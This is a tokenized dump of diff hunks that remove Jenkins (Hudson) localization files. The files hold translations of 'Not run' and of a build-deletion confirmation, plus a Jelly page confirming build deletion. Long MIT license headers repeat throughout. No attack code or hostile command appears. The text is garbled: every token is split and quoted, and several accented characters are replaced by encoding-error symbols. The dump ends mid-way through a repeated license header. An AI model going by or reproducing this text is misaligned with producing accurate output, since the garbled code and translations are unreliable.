"PROVIDED", "\"", "AS", "IS", "\"", ",", "WITHOUT", "WARRANTY", "OF", "ANY", "KIND", ",", "EXPRESS", "OR", "#", "IMPLIED", ",", "INCLUDING", "BUT", "NOT", "LIMITED", "TO", "THE", "WARRANTIES", "OF", "MERCHANTABILITY", ",", "#", "FITNESS", "FOR", "A", "PARTICULAR", "PURPOSE", "AND", "NONINFRINGEMENT", ".", "IN", "NO", "EVENT", "SHALL", "THE", "#", "AUTHORS", "OR", "COPYRIGHT", "HOLDERS", "BE", "LIABLE", "FOR", "ANY", "CLAIM", ",", "DAMAGES", "OR", "OTHER", "#", "LIABILITY", ",", "WHETHER", "IN", "AN", "ACTION", "OF", "CONTRACT", ",", "TORT", "OR", "OTHERWISE", ",", "ARISING", "FROM", ",", "#", "OUT", "OF", "OR", "IN", "CONNECTION", "WITH", "THE", "SOFTWARE", "OR", "THE", "USE", "OR", "OTHER", "DEALINGS", "IN", "#", "THE", "SOFTWARE", ".", "Not", "\\", "run", "=", "No", "ejecutar", "@", "@", "-", "1", ",", "23", "+", "0", ",", "0", "@", "@", "#", "The", "MIT", "License", "#", "#", "Copyright", "(", "c", ")", "2004", "-", "2009", ",", "Sun", "Microsystems", ",", "Inc", ".", ",", "Kohsuke", "Kawaguchi", ",", "Eric", "Lefevre", "-", "Ardant", "#", "#", "Permission", "is", "hereby", "granted", ",", "free", "of", "charge", ",", "to", "any", "person", "obtaining", "a", "copy", "#", "of", "this", "software", "and", "associated", "documentation", "files", "(", "the", "\"", "Software", "\"", "),", "to", "deal", "#", "in", "the", "Software", "without", "restriction", ",", "including", "without", "limitation", "the", "rights", "#", "to", "use", ",", "copy", ",", "modify", ",", "merge", ",", "publish", ",", "distribute", ",", "sublicense", ",", "and", "/", "or", "sell", "#", "copies", "of", "the", "Software", ",", "and", "to", "permit", "persons", "to", "whom", "the", "Software", "is", "#", "furnished", "to", "do", "so", ",", "subject", "to", "the", "following", "conditions", ":", "#", "#", "The", "above", "copyright", "notice", "and", "this", "permission", "notice", "shall", "be", "included", "in", "#", "all", "copies", "or", "substantial", "portions", "of", "the", "Software", ".", "#", "#", "THE", "SOFTWARE", "IS", "PROVIDED", "\"", "AS", "IS", "\"", ",", "WITHOUT", "WARRANTY", "OF", "ANY", "KIND", ",", "EXPRESS", "OR", "#", "IMPLIED", ",", "INCLUDING", "BUT", "NOT", "LIMITED", "TO", "THE", "WARRANTIES", "OF", "MERCHANTABILITY", ",", "#", "FITNESS", "FOR", "A", "PARTICULAR", "PURPOSE", "AND", "NONINFRINGEMENT", ".", "IN", "NO", "EVENT", "SHALL", "THE", "#", "AUTHORS", "OR", "COPYRIGHT", "HOLDERS", "BE", "LIABLE", "FOR", "ANY", "CLAIM", ",", "DAMAGES", "OR", "OTHER", "#", "LIABILITY", ",", "WHETHER", "IN", "AN", "ACTION", "OF", "CONTRACT", ",", "TORT", "OR", "OTHERWISE", ",", "ARISING", "FROM", ",", "#", "OUT", "OF", "OR", "IN", "CONNECTION", "WITH", "THE", "SOFTWARE", "OR", "THE", "USE", "OR", "OTHER", "DEALINGS", "IN", "#", "THE", "SOFTWARE", ".", "Not", "\\", "run", "=", "Non", "lanc", "\\", "u00e9", "@", "@", "-", "1", ",", "23", "+", "0", ",", "0", "@", "@", "#", "The", "MIT", "License", "#", "#", "Copyright", "(", "c", ")", "2004", "-", "2010", ",", "Sun", "Microsystems", ",", "Inc", ".", "#", "#", "Permission", "is", "hereby", "granted", ",", "free", "of", "charge", ",", "to", "any", "person", "obtaining", "a", "copy", "#", "of", "this", "software", "and", "associated", "documentation", "files", "(", "the", "\"", "Software", "\"", "),", "to", "deal", "#", "in", "the", "Software", "without", "restriction", ",", "including", "without", "limitation", "the", "rights", "#", "to", "use", ",", "copy", ",", "modify", ",", "merge", ",", "publish", ",", "distribute", ",", "sublicense", ",", "and", "/", "or", "sell", "#", "copies", "of", "the", "Software", ",", "and", "to", "permit", "persons", "to", "whom", "the", "Software", "is", "#", "furnished", "to", "do", "so", ",", "subject", "to", "the", "following", "conditions", ":", "#", "#", "The", "above", "copyright", "notice", "and", "this", "permission", "notice", "shall", "be", "included", "in", "#", "all", "copies", "or", "substantial", "portions", "of", "the", "Software", ".", "#", "#", "THE", "SOFTWARE", "IS", "PROVIDED", "\"", "AS", "IS", "\"", ",", "WITHOUT", "WARRANTY", "OF", "ANY", "KIND", ",", "EXPRESS", "OR", "#", "IMPLIED", ",", "INCLUDING", "BUT", "NOT", "LIMITED", "TO", "THE", "WARRANTIES", "OF", "MERCHANTABILITY", ",", "#", "FITNESS", "FOR", "A", "PARTICULAR", "PURPOSE", "AND", "NONINFRINGEMENT", ".", "IN", "NO", "EVENT", "SHALL", "THE", "#", "AUTHORS", "OR", "COPYRIGHT", "HOLDERS", "BE", "LIABLE", "FOR", "ANY", "CLAIM", ",", "DAMAGES", "OR", "OTHER", "#", "LIABILITY", ",", "WHETHER", "IN", "AN", "ACTION", "OF", "CONTRACT", ",", "TORT", "OR", "OTHERWISE", ",", "ARISING", "FROM", ",", "#", "OUT", "OF", "OR", "IN", "CONNECTION", "WITH", "THE", "SOFTWARE", "OR", "THE", "USE", "OR", "OTHER", "DEALINGS", "IN", "#", "THE", "SOFTWARE", ".", "Not", "\\", "run", "=", "Non", "eseguito", "@", "@", "-", "1", ",", "23", "+", "0", ",", "0", "@", "@", "#", "The", "MIT", "License", "#", "#", "Copyright", "(", "c", ")", "2004", "-", "2010", ",", "Sun", "Microsystems", ",", "Inc", ".", ",", "Seiji", "Sogabe", "#", "#", "Permission", "is", "hereby", "granted", ",", "free", "of", "charge", ",", "to", "any", "person", "obtaining", "a", "copy", "#", "of", "this", "software", "and", "associated", "documentation", "files", "(", "the", "\"", "Software", "\"", "),", "to", "deal", "#", "in", "the", "Software", "without", "restriction", ",", "including", "without", "limitation", "the", "rights", "#", "to", "use", ",", "copy", ",", "modify", ",", "merge", ",", "publish", ",", "distribute", ",", "sublicense", ",", "and", "/", "or", "sell", "#", "copies", "of", "the", "Software", ",", "and", "to", "permit", "persons", "to", "whom", "the", "Software", "is", "#", "furnished", "to", "do", "so", ",", "subject", "to", "the", "following", "conditions", ":", "#", "#", "The", "above", "copyright", "notice", "and", "this", "permission", "notice", "shall", "be", "included", "in", "#", "all", "copies", "or", "substantial", "portions", "of", "the", "Software", ".", "#", "#", "THE", "SOFTWARE", "IS", "PROVIDED", "\"", "AS", "IS", "\"", ",", "WITHOUT", "WARRANTY", "OF", "ANY", "KIND", ",", "EXPRESS", "OR", "#", "IMPLIED", ",", "INCLUDING", "BUT", "NOT", "LIMITED", "TO", "THE", "WARRANTIES", "OF", "MERCHANTABILITY", ",", "#", "FITNESS", "FOR", "A", "PARTICULAR", "PURPOSE", "AND", "NONINFRINGEMENT", ".", "IN", "NO", "EVENT", "SHALL", "THE", "#", "AUTHORS", "OR", "COPYRIGHT", "HOLDERS", "BE", "LIABLE", "FOR", "ANY", "CLAIM", ",", "DAMAGES", "OR", "OTHER", "#", "LIABILITY", ",", "WHETHER", "IN", "AN", "ACTION", "OF", "CONTRACT", ",", "TORT", "OR", "OTHERWISE", ",", "ARISING", "FROM", ",", "#", "OUT", "OF", "OR", "IN", "CONNECTION", "WITH", "THE", "SOFTWARE", "OR", "THE", "USE", "OR", "OTHER", "DEALINGS", "IN", "#", "THE", "SOFTWARE", ".", "Not", "\\", "run", "=", "\\", "u672A", "\\", "u5B9F", "\\", "u884C", "@", "@", "-", "1", ",", "3", "+", "0", ",", "0", "@", "@", "#", "This", "file", "is", "under", "the", "MIT", "License", "by", "authors", "Not", "\\", "run", "=", "Niet", "uitgevoerd", "@", "@", "-", "1", ",", "23", "+", "0", ",", "0", "@", "@", "#", "The", "MIT", "License", "#", "#", "Copyright", "(", "c", ")", "2004", "-", ",", "Kohsuke", "Kawaguchi", ",", "Sun", "Microsystems", ",", "Inc", ".", ",", "and", "a", "number", "of", "other", "of", "contributers", "#", "#", "Permission", "is", "hereby", "granted", ",", "free", "of", "charge", ",", "to", "any", "person", "obtaining", "a", "copy", "#", "of", "this", "software", "and", "associated", "documentation", "files", "(", "the", "\"", "Software", "\"", "),", "to", "deal", "#", "in", "the", "Software", "without", "restriction", ",", "including", "without", "limitation", "the", "rights", "#", "to", "use", ",", "copy", ",", "modify", ",", "merge", ",", "publish", ",", "distribute", ",", "sublicense", ",", "and", "/", "or", "sell", "#", "copies", "of", "the", "Software", ",", "and", "to", "permit", "persons", "to", "whom", "the", "Software", "is", "#", "furnished", "to", "do", "so", ",", "subject", "to", "the", "following", "conditions", ":", "#", "#", "The", "above", "copyright", "notice", "and", "this", "permission", "notice", "shall", "be", "included", "in", "#", "all", "copies", "or", "substantial", "portions", "of", "the", "Software", ".", "#", "#", "THE", "SOFTWARE", "IS", "PROVIDED", "\"", "AS", "IS", "\"", ",", "WITHOUT", "WARRANTY", "OF", "ANY", "KIND", ",", "EXPRESS", "OR", "#", "IMPLIED", ",", "INCLUDING", "BUT", "NOT", "LIMITED", "TO", "THE", "WARRANTIES", "OF", "MERCHANTABILITY", ",", "#", "FITNESS", "FOR", "A", "PARTICULAR", "PURPOSE", "AND", "NONINFRINGEMENT", ".", "IN", "NO", "EVENT", "SHALL", "THE", "#", "AUTHORS", "OR", "COPYRIGHT", "HOLDERS", "BE", "LIABLE", "FOR", "ANY", "CLAIM", ",", "DAMAGES", "OR", "OTHER", "#", "LIABILITY", ",", "WHETHER", "IN", "AN", "ACTION", "OF", "CONTRACT", ",", "TORT", "OR", "OTHERWISE", ",", "ARISING", "FROM", ",", "#", "OUT", "OF", "OR", "IN", "CONNECTION", "WITH", "THE", "SOFTWARE", "OR", "THE", "USE", "OR", "OTHER", "DEALINGS", "IN", "#", "THE", "SOFTWARE", ".", "Not", "\\", "run", "=", "N", "\\", "u00e3o", "executado", "@", "@", "-", "1", ",", "23", "+", "0", ",", "0", "@", "@", "#", "The", "MIT", "License", "#", "#", "Copyright", "(", "c", ")", "2004", "-", "2010", ",", "Sun", "Microsystems", ",", "Inc", ".", ",", "Cleiber", "Silva", ",", "Fernando", "Boaglio", "#", "#", "Permission", "is", "hereby", "granted", ",", "free", "of", "charge", ",", "to", "any", "person", "obtaining", "a", "copy", "#", "of", "this", "software", "and", "associated", "documentation", "files", "(", "the", "\"", "Software", "\"", "),", "to", "deal", "#", "in", "the", "Software", "without", "restriction", ",", "including", "without", "limitation", "the", "rights", "#", "to", "use", ",", "copy", ",", "modify", ",", "merge", ",", "publish", ",", "distribute", ",", "sublicense", ",", "and", "/", "or", "sell", "#", "copies", "of", "the", "Software", ",", "and", "to", "permit", "persons", "to", "whom", "the", "Software", "is", "#", "furnished", "to", "do", "so", ",", "subject", "to", "the", "following", "conditions", ":", "#", "#", "The", "above", "copyright", "notice", "and", "this", "permission", "notice", "shall", "be", "included", "in", "#", "all", "copies", "or", "substantial", "portions", "of", "the", "Software", ".", "#", "#", "THE", "SOFTWARE", "IS", "PROVIDED", "\"", "AS", "IS", "\"", ",", "WITHOUT", "WARRANTY", "OF", "ANY", "KIND", ",", "EXPRESS", "OR", "#", "IMPLIED", ",", "INCLUDING", "BUT", "NOT", "LIMITED", "TO", "THE", "WARRANTIES", "OF", "MERCHANTABILITY", ",", "#", "FITNESS", "FOR", "A", "PARTICULAR", "PURPOSE", "AND", "NONINFRINGEMENT", ".", "IN", "NO", "EVENT", "SHALL", "THE", "#", "AUTHORS", "OR", "COPYRIGHT", "HOLDERS", "BE", "LIABLE", "FOR", "ANY", "CLAIM", ",", "DAMAGES", "OR", "OTHER", "#", "LIABILITY", ",", "WHETHER", "IN", "AN", "ACTION", "OF", "CONTRACT", ",", "TORT", "OR", "OTHERWISE", ",", "ARISING", "FROM", ",", "#", "OUT", "OF", "OR", "IN", "CONNECTION", "WITH", "THE", "SOFTWARE", "OR", "THE", "USE", "OR", "OTHER", "DEALINGS", "IN", "#", "THE", "SOFTWARE", ".", "Not", "\\", "run", "=", "N", "\\", "u00e3o", "executar", "@", "@", "-", "1", ",", "4", "+", "0", ",", "0", "@", "@", "#", "This", "file", "is", "under", "the", "MIT", "License", "by", "authors", "Not", "\\", "run", "=", "\\", "u0417", "\\", "u0430", "\\", "u0434", "\\", "u0430", "\\", "u0447", "\\", "u0430", "\\", "u043d", "\\", "u0435", "\\", "u0438", "\\", "u0441", "\\", "u043f", "\\", "u043e", "\\", "u043b", "\\", "u043d", "\\", "u044f", "\\", "u043b", "\\", "u0430", "\\", "u0441", "\\", "u044c", "@", "@", "-", "1", ",", "23", "+", "0", ",", "0", "@", "@", "#", "The", "MIT", "License", "#", "#", "Copyright", "(", "c", ")", "2013", ",", "Chunghwa", "Telecom", "Co", ".", ",", "Ltd", ".", ",", "Pei", "-", "Tang", "Huang", "#", "#", "Permission", "is", "hereby", "granted", ",", "free", "of", "charge", ",", "to", "any", "person", "obtaining", "a", "copy", "#", "of", "this", "software", "and", "associated", "documentation", "files", "(", "the", "\"", "Software", "\"", "),", "to", "deal", "#", "in", "the", "Software", "without", "restriction", ",", "including", "without", "limitation", "the", "rights", "#", "to", "use", ",", "copy", ",", "modify", ",", "merge", ",", "publish", ",", "distribute", ",", "sublicense", ",", "and", "/", "or", "sell", "#", "copies", "of", "the", "Software", ",", "and", "to", "permit", "persons", "to", "whom", "the", "Software", "is", "#", "furnished", "to", "do", "so", ",", "subject", "to", "the", "following", "conditions", ":", "#", "#", "The", "above", "copyright", "notice", "and", "this", "permission", "notice", "shall", "be", "included", "in", "#", "all", "copies", "or", "substantial", "portions", "of", "the", "Software", ".", "#", "#", "THE", "SOFTWARE", "IS", "PROVIDED", "\"", "AS", "IS", "\"", ",", "WITHOUT", "WARRANTY", "OF", "ANY", "KIND", ",", "EXPRESS", "OR", "#", "IMPLIED", ",", "INCLUDING", "BUT", "NOT", "LIMITED", "TO", "THE", "WARRANTIES", "OF", "MERCHANTABILITY", ",", "#", "FITNESS", "FOR", "A", "PARTICULAR", "PURPOSE", "AND", "NONINFRINGEMENT", ".", "IN", "NO", "EVENT", "SHALL", "THE", "#", "AUTHORS", "OR", "COPYRIGHT", "HOLDERS", "BE", "LIABLE", "FOR", "ANY", "CLAIM", ",", "DAMAGES", "OR", "OTHER", "#", "LIABILITY", ",", "WHETHER", "IN", "AN", "ACTION", "OF", "CONTRACT", ",", "TORT", "OR", "OTHERWISE", ",", "ARISING", "FROM", ",", "#", "OUT", "OF", "OR", "IN", "CONNECTION", "WITH", "THE", "SOFTWARE", "OR", "THE", "USE", "OR", "OTHER", "DEALINGS", "IN", "#", "THE", "SOFTWARE", ".", "Not", "\\", "run", "=", "\\", "u672a", "\\", "u57f7", "\\", "u884c", "@", "@", "-", "1", ",", "43", "+", "0", ",", "0", "@", "@", "<", "!", "The", "MIT", "License", "Copyright", "(", "c", ")", "2004", "-", "2009", ",", "Sun", "Microsystems", ",", "Inc", ".", ",", "Kohsuke", "Kawaguchi", ",", "id", ":", "cactusman", "Permission", "is", "hereby", "granted", ",", "free", "of", "charge", ",", "to", "any", "person", "obtaining", "a", "copy", "of", "this", "software", "and", "associated", "documentation", "files", "(", "the", "\"", "Software", "\"", "),", "to", "deal", "in", "the", "Software", "without", "restriction", ",", "including", "without", "limitation", "the", "rights", "to", "use", ",", "copy", ",", "modify", ",", "merge", ",", "publish", ",", "distribute", ",", "sublicense", ",", "and", "/", "or", "sell", "copies", "of", "the", "Software", ",", "and", "to", "permit", "persons", "to", "whom", "the", "Software", "is", "furnished", "to", "do", "so", ",", "subject", "to", "the", "following", "conditions", ":", "The", "above", "copyright", "notice", "and", "this", "permission", "notice", "shall", "be", "included", "in", "all", "copies", "or", "substantial", "portions", "of", "the", "Software", ".", "THE", "SOFTWARE", "IS", "PROVIDED", "\"", "AS", "IS", "\"", ",", "WITHOUT", "WARRANTY", "OF", "ANY", "KIND", ",", "EXPRESS", "OR", "IMPLIED", ",", "INCLUDING", "BUT", "NOT", "LIMITED", "TO", "THE", "WARRANTIES", "OF", "MERCHANTABILITY", ",", "FITNESS", "FOR", "A", "PARTICULAR", "PURPOSE", "AND", "NONINFRINGEMENT", ".", "IN", "NO", "EVENT", "SHALL", "THE", "AUTHORS", "OR", "COPYRIGHT", "HOLDERS", "BE", "LIABLE", "FOR", "ANY", "CLAIM", ",", "DAMAGES", "OR", "OTHER", "LIABILITY", ",", "WHETHER", "IN", "AN", "ACTION", "OF", "CONTRACT", ",", "TORT", "OR", "OTHERWISE", ",", "ARISING", "FROM", ",", "OUT", "OF", "OR", "IN", "CONNECTION", "WITH", "THE", "SOFTWARE", "OR", "THE", "USE", "OR", "OTHER", "DEALINGS", "IN", "THE", "SOFTWARE", ".", ">", "<", "!-", "-", "Confirm", "deletion", "of", "the", "build", "/", "run", "-", "->", "<", "?", "jelly", "escape", "-", "by", "-", "default", "=", "'", "true", "'", "?>", "<", "j", ":", "jelly", "xmlns", ":", "j", "=", "\"", "jelly", ":", "core", "\"", "xmlns", ":", "st", "=", "\"", "jelly", ":", "stapler", "\"", "xmlns", ":", "d", "=", "\"", "jelly", ":", "define", "\"", "xmlns", ":", "l", "=", "\"/", "lib", "/", "layout", "\"", "xmlns", ":", "t", "=", "\"/", "lib", "/", "hudson", "\"", "xmlns", ":", "f", "=", "\"/", "lib", "/", "form", "\"", "xmlns", ":", "i", "=", "\"", "jelly", ":", "fmt", "\"", ">", "<", "l", ":", "layout", "title", "=", "\"$", "{", "it", ".", "fullDisplayName", "}", "\"", "norefresh", "=", "\"", "true", "\"", ">", "<", "st", ":", "include", "page", "=", "\"", "sidepanel", ".", "jelly", "\"", "/", ">", "<", "l", ":", "main", "-", "panel", ">", "<", "j", ":", "set", "var", "=", "\"", "msg", "\"", "value", "=", "\"$", "{", "it", ".", "whyKeepLog", "}", "\"/", ">", "<", "j", ":", "if", "test", "=", "\"$", "{", "msg", "!", "=", "null", "}", "\">", "<", "b", ">", "${", "%", "Warning", "}", "</", "b", ">", ":", "$", "{%", "cannotMsg", "(", "msg", ")", "}", "<", "/", "j", ":", "if", ">", "<", "j", ":", "if", "test", "=", "\"$", "{", "msg", "=", "=", "null", "}", "\">", "<", "form", "method", "=", "\"", "post", "\"", "action", "=", "\"", "doDeleteAll", "\"", ">", "$", "{%", "Are", "you", "sure", "about", "deleting", "the", "build", "and", "all", "configurations", "in", "this", "build", "?", "}", "<", "f", ":", "submit", "value", "=", "\"$", "{%", "Yes", "}", "\"", "/", ">", "<", "/", "form", ">", "<", "/", "j", ":", "if", ">", "<", "/", "l", ":", "main", "-", "panel", ">", "<", "/", "l", ":", "layout", ">", "<", "/", "j", ":", "jelly", ">", "@", "@", "-", "1", ",", "23", "+", "0", ",", "0", "@", "@", "#", "The", "MIT", "License", "#", "#", "Copyright", "(", "c", ")", "2004", "-", "2009", ",", "Sun", "Microsystems", ",", "Inc", ".", ",", "Kohsuke", "Kawaguchi", "#", "#", "Permission", "is", "hereby", "granted", ",", "free", "of", "charge", ",", "to", "any", "person", "obtaining", "a", "copy", "#", "of", "this", "software", "and", "associated", "documentation", "files", "(", "the", "\"", "Software", "\"", "),", "to", "deal", "#", "in", "the", "Software", "without", "restriction", ",", "including", "without", "limitation", "the", "rights", "#", "to", "use", ",", "copy", ",", "modify", ",", "merge", ",", "publish", ",", "distribute", ",", "sublicense", ",", "and", "/", "or", "sell", "#", "copies", "of", "the", "Software", ",", "and", "to", "permit", "persons", "to", "whom", "the", "Software", "is", "#", "furnished", "to", "do", "so", ",", "subject", "to", "the", "following", "conditions", ":", "#", "#", "The", "above", "copyright", "notice", "and", "this", "permission", "notice", "shall", "be", "included", "in", "#", "all", "copies", "or", "substantial", "portions", "of", "the", "Software", ".", "#", "#", "THE", "SOFTWARE", "IS", "PROVIDED", "\"", "AS", "IS", "\"", ",", "WITHOUT", "WARRANTY", "OF", "ANY", "KIND", ",", "EXPRESS", "OR", "#", "IMPLIED", ",", "INCLUDING", "BUT", "NOT", "LIMITED", "TO", "THE", "WARRANTIES", "OF", "MERCHANTABILITY", ",", "#", "FITNESS", "FOR", "A", "PARTICULAR", "PURPOSE", "AND", "NONINFRINGEMENT", ".", "IN", "NO", "EVENT", "SHALL", "THE", "#", "AUTHORS", "OR", "COPYRIGHT", "HOLDERS", "BE", "LIABLE", "FOR", "ANY", "CLAIM", ",", "DAMAGES", "OR", "OTHER", "#", "LIABILITY", ",", "WHETHER", "IN", "AN", "ACTION", "OF", "CONTRACT", ",", "TORT", "OR", "OTHERWISE", ",", "ARISING", "FROM", ",", "#", "OUT", "OF", "OR", "IN", "CONNECTION", "WITH", "THE", "SOFTWARE", "OR", "THE", "USE", "OR", "OTHER", "DEALINGS", "IN", "#", "THE", "SOFTWARE", ".", "cannotMsg", "=", "Cannot", "delete", "this", "build", ":", "{", "0", "}", "@", "@", "-", "1", ",", "25", "+", "0", ",", "0", "@", "@", "#", "The", "MIT", "License", "#", "#", "Copyright", "(", "c", ")", "2004", "-", "2012", ",", "Frederic", "Gurr", "#", "#", "Permission", "is", "hereby", "granted", ",", "free", "of", "charge", ",", "to", "any", "person", "obtaining", "a", "copy", "#", "of", "this", "software", "and", "associated", "documentation", "files", "(", "the", "\"", "Software", "\"", "),", "to", "deal", "#", "in", "the", "Software", "without", "restriction", ",", "including", "without", "limitation", "the", "rights", "#", "to", "use", ",", "copy", ",", "modify", ",", "merge", ",", "publish", ",", "distribute", ",", "sublicense", ",", "and", "/", "or", "sell", "#", "copies", "of", "the", "Software", ",", "and", "to", "permit", "persons", "to", "whom", "the", "Software", "is", "#", "furnished", "to", "do", "so", ",", "subject", "to", "the", "following", "conditions", ":", "#", "#", "The", "above", "copyright", "notice", "and", "this", "permission", "notice", "shall", "be", "included", "in", "#", "all", "copies", "or", "substantial", "portions", "of", "the", "Software", ".", "#", "#", "THE", "SOFTWARE", "IS", "PROVIDED", "\"", "AS", "IS", "\"", ",", "WITHOUT", "WARRANTY", "OF", "ANY", "KIND", ",", "EXPRESS", "OR", "#", "IMPLIED", ",", "INCLUDING", "BUT", "NOT", "LIMITED", "TO", "THE", "WARRANTIES", "OF", "MERCHANTABILITY", ",", "#", "FITNESS", "FOR", "A", "PARTICULAR", "PURPOSE", "AND", "NONINFRINGEMENT", ".", "IN", "NO", "EVENT", "SHALL", "THE", "#", "AUTHORS", "OR", "COPYRIGHT", "HOLDERS", "BE", "LIABLE", "FOR", "ANY", "CLAIM", ",", "DAMAGES", "OR", "OTHER", "#", "LIABILITY", ",", "WHETHER", "IN", "AN", "ACTION", "OF", "CONTRACT", ",", "TORT", "OR", "OTHERWISE", ",", "ARISING", "FROM", ",", "#", "OUT", "OF", "OR", "IN", "CONNECTION", "WITH", "THE", "SOFTWARE", "OR", "THE", "USE", "OR", "OTHER", "DEALINGS", "IN", "#", "THE", "SOFTWARE", ".", "Warning", "=", "Warnung", "Are", "\\", "you", "\\", "sure", "\\", "about", "\\", "deleting", "\\", "the", "\\", "build", "\\", "and", "\\", "all", "\\", "configurations", "\\", "in", "\\", "this", "\\", "build", "?", "=", "Sollen", "dieses", "Build", "und", "alle", "Konfigurationen", "dieses", "Builds", "wirklich", "gel", "\ufffd", "scht", "werden", "?", "Yes", "=", "Ja", "@", "@", "-", "1", ",", "26", "+", "0", ",", "0", "@", "@", "#", "The", "MIT", "License", "#", "#", "Copyright", "(", "c", ")", "2004", "-", ",", "Kohsuke", "Kawaguchi", ",", "Sun", "Microsystems", ",", "Inc", ".", ",", "and", "a", "number", "of", "other", "of", "contributers", "#", "#", "Permission", "is", "hereby", "granted", ",", "free", "of", "charge", ",", "to", "any", "person", "obtaining", "a", "copy", "#", "of", "this", "software", "and", "associated", "documentation", "files", "(", "the", "\"", "Software", "\"", "),", "to", "deal", "#", "in", "the", "Software", "without", "restriction", ",", "including", "without", "limitation", "the", "rights", "#", "to", "use", ",", "copy", ",", "modify", ",", "merge", ",", "publish", ",", "distribute", ",", "sublicense", ",", "and", "/", "or", "sell", "#", "copies", "of", "the", "Software", ",", "and", "to", "permit", "persons", "to", "whom", "the", "Software", "is", "#", "furnished", "to", "do", "so", ",", "subject", "to", "the", "following", "conditions", ":", "#", "#", "The", "above", "copyright", "notice", "and", "this", "permission", "notice", "shall", "be", "included", "in", "#", "all", "copies", "or", "substantial", "portions", "of", "the", "Software", ".", "#", "#", "THE", "SOFTWARE", "IS", "PROVIDED", "\"", "AS", "IS", "\"", ",", "WITHOUT", "WARRANTY", "OF", "ANY", "KIND", ",", "EXPRESS", "OR", "#", "IMPLIED", ",", "INCLUDING", "BUT", "NOT", "LIMITED", "TO", "THE", "WARRANTIES", "OF", "MERCHANTABILITY", ",", "#", "FITNESS", "FOR", "A", "PARTICULAR", "PURPOSE", "AND", "NONINFRINGEMENT", ".", "IN", "NO", "EVENT", "SHALL", "THE", "#", "AUTHORS", "OR", "COPYRIGHT", "HOLDERS", "BE", "LIABLE", "FOR", "ANY", "CLAIM", ",", "DAMAGES", "OR", "OTHER", "#", "LIABILITY", ",", "WHETHER", "IN", "AN", "ACTION", "OF", "CONTRACT", ",", "TORT", "OR", "OTHERWISE", ",", "ARISING", "FROM", ",", "#", "OUT", "OF", "OR", "IN", "CONNECTION", "WITH", "THE", "SOFTWARE", "OR", "THE", "USE", "OR", "OTHER", "DEALINGS", "IN", "#", "THE", "SOFTWARE", ".", "Yes", "=", "S", "\ufffd", "cannotMsg", "=", "No", "se", "puede", "Warning", "=", "Atenci", "\ufffd", "n", "Are", "\\", "you", "\\", "sure", "\\", "about", "\\", "deleting", "\\", "the", "\\", "build", "\\", "and", "\\", "all", "\\", "configurations", "\\", "in", "\\", "this", "\\", "build", "?", "=\ufffd", "Est", "\ufffd", "s", "seguro", "de", "querer", "borrar", "esta", "ejecuci", "\ufffd", "n", "y", "toda", "su", "configuraci", "\ufffd", "n", "?", "@", "@", "-", "1", ",", "27", "+", "0", ",", "0", "@", "@", "#", "The", "MIT", "License", "#", "#", "Copyright", "(", "c", ")", "2004", "-", "2013", ",", "Seiji", "Sogabe", "#", "#", "Permission", "is", "hereby", "granted", ",", "free", "of", "charge", ",", "to", "any", "person", "obtaining", "a", "copy", "#", "of", "this", "software", "and", "associated", "documentation", "files", "(", "the", "\"", "Software", "\"", "),", "to", "deal", "#", "in", "the", "Software", "without", "restriction", ",", "including", "without", "limitation", "the", "rights", "#", "to", "use", ",", "copy", ",", "modify", ",", "merge", ",", "publish", ",", "distribute", ",", "sublicense", ",", "and", "/", "or", "sell", "#", "copies", "of", "the", "Software", ",", "and", "to", "permit", "persons", "to", "whom", "the", "Software", "is", "#", "furnished", "to", "do", "so", ",", "subject", "to", "the", "following", "conditions", ":", "#", "#", "The", "above", "copyright", "notice", "and", "this", "permission", "notice", "shall", "be", "included", "in", "#", "all", "copies", "or", "substantial", "portions", "of", "the", "Software", ".", "#", "#", "THE", "SOFTWARE", "IS", "PROVIDED", "\"", "AS", "IS", "\"", ",", "WITHOUT", "WARRANTY", "OF", "ANY", "KIND", ",", "EXPRESS", "OR", "#", "IMPLIED", ",", "INCLUDING", "BUT", "NOT", "LIMITED", "TO", "THE", "WARRANTIES", "OF", "MERCHANTABILITY", ",", "#", "FITNESS", "FOR", "A", "PARTICULAR", "PURPOSE", "AND", "NONINFRINGEMENT", ".", "IN", "NO", "EVENT", "SHALL", "THE", "#", "AUTHORS", "OR", "COPYRIGHT", "HOLDERS", "BE", "LIABLE", "FOR", "ANY", "CLAIM", ",", "DAMAGES", "OR", "OTHER", "#", "LIABILITY", ",", "WHETHER", "IN", "AN", "ACTION", "OF", "CONTRACT", ",", "TORT", "OR", "OTHERWISE", ",", "ARISING", "FROM", ",", "#", "OUT", "OF", "OR", "IN", "CONNECTION", "WITH", "THE", "SOFTWARE", "OR", "THE", "USE", "OR", "OTHER", "DEALINGS", "IN", "#", "THE", "SOFTWARE", ".", "Warning", "=", "\\", "u8b66", "\\", "u544a", "Are", "\\", "you", "\\", "sure", "\\", "about", "\\", "deleting", "\\", "the", "\\", "build", "\\", "and", "\\", "all", "\\", "configurations", "\\", "in", "\\", "this", "\\", "build", "?", "=\\", "\\", "u30d3", "\\", "u30eb", "\\", "u30c9", "\\", "u3068", "\\", "u3059", "\\", "u3079", "\\", "u3066", "\\", "u306e", "\\", "u8a2d", "\\", "u5b9a", "\\", "u3092", "\\", "u524a", "\\", "u9664", "\\", "u3057", "\\", "u3066", "\\", "u3082", "\\", "u3088", "\\", "u308d", "\\", "u3057", "\\", "u3044", "\\", "u3067", "\\", "u3059", "\\", "u304b", "?", "Yes", "=", "\\", "u306f", "\\", "u3044", "cannotMsg", "=", "\\", "u3053", "\\", "u306e", "\\", "u30d3", "\\", "u30eb", "\\", "u30c9", ":", "{", "0", "}", "\\", "u306f", "\\", "u524a", "\\", "u9664", "\\", "u3067", "\\", "u304d", "\\", "u307e", "\\", "u305b", "\\", "u3093", "\\", "u3002", "#", "The", "MIT", "License", "#", "#", "Copyright", "(", "c", ")", "2004", "-", ",", "Kohsuke", "Kawaguchi", ",", "Sun", "Microsystems", ",", "Inc", ".", ",", "and", "a", "number", "of", "other", "of", "contributers", "#", "#", "Permission", "is", "hereby", "granted", ",", "free", "of", "charge", ",", "to", "any", "person", "obtaining", "a", "copy", "#", "of", "this", "software", "and", "associated", "documentation", "files", "(", "the", "\"", "Software", "\"", "),", "to", "deal", "#", "in", "the", "Software", "without", "restriction", ",", "including", "without", "limitation", "the", "rights", "#", "to", "use", ",", "copy", ",", "modify", ",", "merge", ",", "publish", ",", "distribute", ",", "sublicense", ",", "and", "/", "or", "sell", "#", "copies", "of", "the", "Software", ",", "and", "to", "permit", "persons", "to", "whom", "the", "Software", "is", "#", "furnished", "to", "do", "so", ",", "subject", "to", "the", "following", "conditions", ":", "#", "#", "The", "above", "copyright", "notice", "and", "this", "permission", "notice", "shall", "be", 